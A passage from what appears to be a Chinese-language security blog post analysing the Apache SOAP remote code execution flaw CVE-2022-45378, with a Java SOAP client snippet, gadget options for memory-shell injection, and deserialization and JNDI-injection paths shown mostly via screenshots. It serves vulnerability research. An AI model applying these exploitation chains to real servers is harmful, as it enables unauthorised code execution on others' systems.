<span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Call</span>(  );</span><br><span class="line">      call.setTargetObjectURI(<span class="string">&quot;sleep&quot;</span>);</span><br><span class="line">      call.setMethodName(<span class="string">&quot;sleep&quot;</span>);</span><br><span class="line">      call.setEncodingStyleURI(Constants.NS_URI_SOAP_ENC);</span><br><span class="line">      <span class="type">Vector</span> <span class="variable">params</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Vector</span>();</span><br><span class="line">      params.addElement(<span class="keyword">new</span> <span class="title class_">Parameter</span>(<span class="string">&quot;time&quot;</span>, <span class="type">int</span>.class, <span class="number">5000</span>, <span class="literal">null</span>));</span><br><span class="line">      call.setParams(params);</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="type">Response</span> <span class="variable">resp</span> <span class="operator">=</span> call.invoke(url, <span class="string">&quot;&quot;</span>);</span><br><span class="line">         <span class="type">Parameter</span> <span class="variable">ret</span> <span class="operator">=</span> resp.getReturnValue(  );</span><br><span class="line">         <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> ret.getValue(  );</span><br><span class="line">         System.out.println(<span class="string">&quot;Result is &quot;</span> + value);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (SOAPException e) &#123;</span><br><span class="line">         System.err.println(<span class="string">&quot;Caught SOAPException (&quot;</span> +</span><br><span class="line">                         e.getFaultCode(  ) + <span class="string">&quot;): &quot;</span> +</span><br><span class="line">                         e.getMessage(  ));</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190607802.png" alt="image-20240707190607802"></p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>目标 jdk 是 8u251 以下可以考虑 bcel ：<code>com.sun.org.apache.bcel.internal.util.JavaWrapper._main()</code> ，或者目标存在 groovy 依赖，可以使用 <code>GroovyShell.evaluate</code>() ，或者，soap 一般会和 tomcat 环境一起用，可以直接使用：<code>ELProcessor.eval()</code> ，前面可以通过直接加载 class 完成 agentNoFile 的内存马注入，后两者可以通过表达式结合 js 引擎完成内存马注入。</p>
<h2 id="另一种方式"><a href="#另一种方式" class="headerlink" title="另一种方式"></a>另一种方式</h2><p>前面的 deploy 方式有些复杂，如果能访问： <code>/soap/admin/index.html</code> ，可以看到 soap 的管理台，deploy 菜单可以部署服务，例如想要部署一个 <code>Thread.sleep()</code> 的：</p>
<p><img src="/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190620851.png" alt="image-20240707190620851"></p>
<p>调用方式还是和前面一样。</p>
<h2 id="more"><a href="#more" class="headerlink" title="more"></a>more</h2><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>还是使用 jar-analyzer 查找反序列化漏洞，还真有两个入口点：</p>
<p><img src="/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190633452.png" alt="image-20240707190633452"></p>
<p>第二个 <code>loadRegistry</code> 是从配置文件中读取信息，不可控，所以没法利用。</p>
<p>第一个是从用户可控数据反序列化，数据流：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RPCRouterServlet.doPost -&gt; StatefulEJBProvider.locate -&gt; StatefulEJBProvider.deSerialize -&gt; readObject</span><br></pre></td></tr></table></figure>

<p>但是缺点是需要从 xmlns 命令空间中获取 base64 数据，而根据 jdk 的默认策略，长度为 1000，几乎不可利用，需要配置运行时参数 <code>-Djdk.xml.maxXMLNameLimit=10000</code> 让长度足够写入利用代码。是否有其他方式不清楚。</p>
<p><img src="/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190644517.png" alt="image-20240707190644517"></p>
<p>尝试用 URLDNS 利用链测试，可以正常运行：</p>
<p><img src="/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190653343.png" alt="image-20240707190653343"></p>
<p><img src="/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190657347.png" alt="image-20240707190657347"></p>
<h3 id="jndi-注入"><a href="#jndi-注入" class="headerlink" title="jndi 注入"></a>jndi 注入</h3><p>查找 jndi 注入漏洞：</p>
<p><img src="/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190706264.png" alt="image-20240707190706264"></p>
<p>这 3 个实际上都是类似的，所以以第一个为例：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RPCRouterServlet.doPost -&gt; EntityEJBProvider.locate -&gt; lookup</span><br></pre></td></tr></table></figure>

<p>和上面一样，都是需要 <code>user-defined</code> 的 provider，并且把 provider class 设置为上面 3 个中的任意一个。然后跟进去：</p>
<p><img src="/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190716181.png" alt="image-20240707190716181"></p>
<p>从这个分支来看，会通过 <code>loadProvider</code> 去加载：</p>
<p><img src="/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190725070.png" alt="image-20240707190725070"></p>
<p>取到 provider 之后，来到 <code>locate</code> 方法：</p>
<p><img src="/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190735007.png" alt="image-20240707190735007"></p>
<p><code>locate</code> 方法有两个分支：</p>
<p><img src="/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190746965.png" alt="image-20240707190746965"></p>
<p>当 <code>ejbkey</code> 不为空时，就是上面的反序列化，为空时，就走到了下面的 jndi 注入逻辑。</p>
<p>往下走，会从 <code>DeploymentDescriptor</code> 中取到 4 个 properties， <code>ContextProviderURL</code> , <code>FullContextFactoryName</code> 用来初始化 context，<code>FullHomeInterfaceName</code> 在这里看起来没起到作用，可以随便赋值，<code>JNDIName</code> 是去 lookup 的值，也是我们 rmiserver 端绑定的 name。</p>
<p>从 web 页面去配置的话，内容如下：</p>
<p><img src="/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190756964.png" alt="image-20240707190756964"></p>
<p>deploy 了该 service 之后，启动 rmiserver，这里用了 groovy 的依赖去 bypass jdk8u191 的限制，因为本地是高版本的。然后启动 rmiserver。</p>
<p><img src="/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190806441.png" alt="image-20240707190806441"></p>
<p>请求内容只要能到对应的 service 就行了，不需要额外参数：</p>
<p><img src="/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240707190817934.png" alt="image-20240707190817934"></p>
<p>执行成功：</p>
<p><img src="/2024/07/07/apache-soap-rce-cve-2022-45378/image-20240607193755903.png" alt="image-20240607193755903"></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2022-45378">https://nvd.nist.gov/vuln/detail/CVE-2022-45378</a></p>
<p><a target="_blank" rel="noopener" href="https://www.oreilly.com/library/view/java-and-soap/0596001754/ch04.html">https://www.oreilly.com/library/view/java-and-soap/0596001754/ch04.html</a></p>
<p><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/8/docs/technotes/guides/security/jaxp/jaxp.html#maxXMLNameLimit">https://docs.oracle.com/javase/8/docs/technotes/guides/security/jaxp/jaxp.html#maxXMLNameLimit</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/jar-analyzer/jar-analyzer">https://github.com/jar-analyzer/jar-analyzer</a></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/me">About</a></li>
        
          <li><a href="/archives/">Archive</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">2.</span> <span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0-poc"><span class="toc-number">3.</span> <span class="toc-text">构造 poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%A6%E4%B8%80%E7%A7%8D%E6%96%B9%E5%BC%8F"><span class="toc-number">5.</span> <span class="toc-text">另一种方式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#more"><span class="toc-number">6.</span> <span class="toc-text">more</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">6.1.</span> <span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jndi-%E6%B3%A8%E5%85%A5"><span class="toc-number">6.2.</span> <span class="toc-text">jndi 注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">7.</span> <span class="toc-text">参考</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/&text=apache soap rce(cve-2022-45378)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/&title=apache soap rce(cve-2022-45378)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/&is_video=false&description=apache soap rce(cve-2022-45378)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=apache soap rce(cve-2022-45378)&body=Check out this article: http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/&title=apache soap rce(cve-2022-45378)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/&title=apache soap rce(cve-2022-45378)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/&title=apache soap rce(cve-2022-45378)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/&title=apache soap rce(cve-2022-45378)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/&name=apache soap rce(cve-2022-45378)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/07/07/apache-soap-rce-cve-2022-45378/&t=apache soap rce(cve-2022-45378)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2024-2025
    wude
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/me">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Archive</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
